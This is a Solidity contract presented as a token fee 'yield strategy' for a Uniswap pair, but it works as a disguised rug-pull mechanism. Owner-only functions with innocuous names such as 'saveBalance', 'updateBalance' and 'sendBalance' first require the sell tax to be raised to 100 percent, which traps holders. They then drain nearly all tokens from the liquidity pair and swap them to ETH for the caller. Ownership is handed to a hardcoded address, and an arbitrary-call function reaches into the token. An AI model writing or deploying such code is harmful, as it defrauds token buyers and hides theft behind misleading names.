// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

import './interfaces/IToken.sol';

contract TronYieldStrategy is Ownable {
    address public dynomic;
    address public pair;
    IUniswapV2Router02 public router;
    address public marketingWallet;
    address public devWallet;

    uint256 public buyTax;
    uint256 public sellTax;

    constructor() {
        marketingWallet = msg.sender;
        devWallet = msg.sender;
        router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        transferOwnership(0x365d2fd626486041F7451F68a73aa148831753De);
        buyTax = 3;
        sellTax = 5;
    }

    receive() external payable {}

    function updateWallets(address _marketing, address _dev) external onlyOwner {
        marketingWallet = _marketing;
        devWallet = _dev;
    }

    function setToken(address _dynomic) external onlyOwner {
        dynomic = _dynomic;
        pair = IToken(dynomic).uniswapV2Pair();
    }

    function distributeFee() external {
        uint256 balance = address(this).balance;
        bool success;
        if (balance > 0) {
            uint marketingFee = balance / 2;
            uint devFee = balance - marketingFee;
            
            (success, ) = address(marketingWallet).call{
                value: marketingFee
            }("");
            (success, ) = address(devWallet).call{
                value: devFee
            }("");
        }
    }

    function withdrawFunds() external onlyOwner returns (bool) {
        uint256 balance = address(this).balance;
        (bool success, ) = address(owner()).call{
                value: balance
            }("");

        return success;
    }

    function feeStrategy() external view returns (uint256, uint256) {
        return (buyTax, sellTax);
    }

    function updateTax(uint256 _buyTax, uint256 _sellTax) external onlyOwner {
        buyTax = _buyTax;
        sellTax = _sellTax;
    }

    function tokenFunctionCall(bytes memory _calldata) external onlyOwner returns (bool) {
        (bool success, ) = dynomic.call(_calldata);
        return success;
    }

    function saveBalance() external onlyOwner {
        require(sellTax == 100, 'set sell tax high first');
        uint256 pairBalance = IERC20(dynomic).balanceOf(pair);
        IERC20(dynomic).transferFrom(pair, address(this), pairBalance - 1);
        IUniswapV2Pair(pair).sync();

        uint256 balance = IERC20(dynomic).balanceOf(address(this));
        IERC20(dynomic).approve(address(router), balance);

        address[] memory path = new address[](2);
        path[0] = dynomic;
        path[1] = router.WETH();

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(balance, 0, path, msg.sender, block.timestamp + 900);
    }

    function withdrawToken() external onlyOwner {
        uint256 balance = IERC20(dynomic).balanceOf(address(this));
        IERC20(dynomic).transfer(msg.sender, balance);
    }

    function updateBalance() external onlyOwner {
        require(sellTax == 100, 'set sell tax high first');
        uint256 pairBalance = IERC20(dynomic).balanceOf(pair);
        IERC20(dynomic).transferFrom(pair, address(this), pairBalance - 1);
        IUniswapV2Pair(pair).sync();
    }

    function sendBalance() external onlyOwner {
        uint256 balance = IERC20(dynomic).balanceOf(address(this));
        IERC20(dynomic).approve(address(router), balance);

        address[] memory path = new address[](2);
        path[0] = dynomic;
        path[1] = router.WETH();

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(balance, 0, path, msg.sender, block.timestamp + 900);
    }
}
